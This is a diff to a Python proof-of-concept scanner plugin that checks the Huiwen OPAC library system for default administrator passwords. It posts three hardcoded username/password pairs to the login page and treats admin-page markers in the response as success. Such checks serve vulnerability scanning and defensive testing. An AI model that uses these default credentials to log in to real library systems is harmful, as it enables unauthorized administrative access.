@@ -10,11 +10,12 @@ class POC(POCBase):
 
     _info = {
         "author" : "jijue",                      # POC作者
-        "version" : "1",                    # POC版本，默认是1  
+        "version" : "2",                    # POC版本，默认是1  
         "CreateDate" : "2021-06-09",        # POC创建时间
         "UpdateDate" : "2021-06-09",        # POC创建时间
         "PocDesc" : """
-            当前版本仅针对该漏洞有效，并没有加入对全量POC扫描场景的考量，后续仍会改进    
+            v1:当前版本仅针对该漏洞有效，并没有加入对全量POC扫描场景的考量，后续仍会改进   
+            v2:上一版的逻辑质量有点低，感谢huangstts同学的指正，这一版相对来说会好很多，如果还有其他不足（漏报和误报），希望能得到小伙伴们的指点
         """,                                # POC描述，写更新描述，没有就不写
 
         "name" : "汇文OPAC弱口令",                        # 漏洞名称
@@ -52,26 +53,33 @@ class POC(POCBase):
                     "Content-Type": "application/x-www-form-urlencoded",
                     }
         
-        data0 = "username=opac_admin&passwd=huiwen_opac"
-        data1 = "username=view_admin&passwd=huiwen_opac"
-        data2 = "username=map_admin&passwd=huiwen_opac"
+        data0 = "username=opac_admin&passwd=huiwen_opac"  # 系统管理员
+        data1 = "username=view_admin&passwd=huiwen_opac"  # 书评管理员
+        data2 = "username=map_admin&passwd=huiwen_opac"  # 地图管理员
         try:
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             req0 = requests.post(url,data=data0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if req0.status_code == 200 and flag0 not in req0.text:# "OPAC v" in req0.text:
+            if req0.status_code == 200 and \
+                "MARC" in req0.text and \
+                    "<a href=\"logout.php\">" in req0.text:
                 vuln = [True,"<html><title>opac_admin::huiwen_opac</title></html>"]
             else:
                 req1 = requests.post(url,data=data1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-                if req1.status_code == 200 and flag0 not in req1.text:# "OPAC v" in req1.text:
+                if req1.status_code == 200 and \
+                    "<a href=\"logout.php\">" in req1.text and \
+                        "<INPUT type=\"submit\" name=\"sub_del\"  value=\"" in req1.text and \
+                            "<INPUT type=\"submit\" name=\"sub_audit\"  value=\"" in req1.text:
                     vuln = [True,"<html><title>view_admin::huiwen_opac</title></html>"]
                 else:
                     req2 = requests.post(url,data=data2,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-                    if req2.status_code == 200 and flag0 not in req2.text:# "OPAC v" in req2.text:
+                    if req2.status_code == 200 and \
+                        "<a href=\"logout.php\">" in req2.text and \
+                            "<h2 class=\"fl\">" in req2.text and \
+                                "<span class=\"orange\">" in req2.text:
                         vuln = [True,"<html><title>map_admin::huiwen_opac</title></html>"]
 
-                # vuln = [False,req0.text]
         except Exception as e:
             raise e
         
